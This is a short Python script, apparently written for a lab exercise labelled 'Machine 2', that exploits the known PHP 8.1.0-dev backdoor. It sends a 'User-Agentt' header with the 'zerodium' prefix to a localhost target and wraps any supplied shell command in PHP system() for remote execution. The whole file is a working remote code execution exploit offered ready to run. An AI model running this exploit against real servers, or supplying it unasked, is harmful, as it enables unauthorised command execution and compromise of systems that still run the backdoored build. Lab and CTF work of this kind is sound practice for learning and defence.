#!/usr/bin/env python3
"""
Machine 2 - PHP 8.1.0-dev Backdoor Exploit
Target: http://localhost:9021
Vulnerability: Backdoor via User-Agentt header (zerodium prefix)
"""

import requests
import sys

TARGET = "http://localhost:9021"

def exploit(cmd):
    """Exploit PHP 8.1.0-dev backdoor via User-Agentt header"""
    # Wrap the system command in PHP since the server uses eval()
    php_code = f"system('{cmd}');"
    headers = {
        "User-Agentt": f"zerodium{php_code}"
    }
    
    try:
        response = requests.get(TARGET, headers=headers, timeout=10)
        return response.text
    except requests.RequestException as e:
        return f"Error: {e}"

def main():
    print("[*] Machine 2 - PHP 8.1.0-dev Backdoor Exploit")
    print(f"[*] Target: {TARGET}")
    print("-" * 50)
    
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = "id"
    
    print(f"[+] Executing command: {cmd}")
    print("-" * 50)
    
    result = exploit(cmd)
    # The server no longer wraps output in <pre> tags
    print(result)

if __name__ == "__main__":
    main()
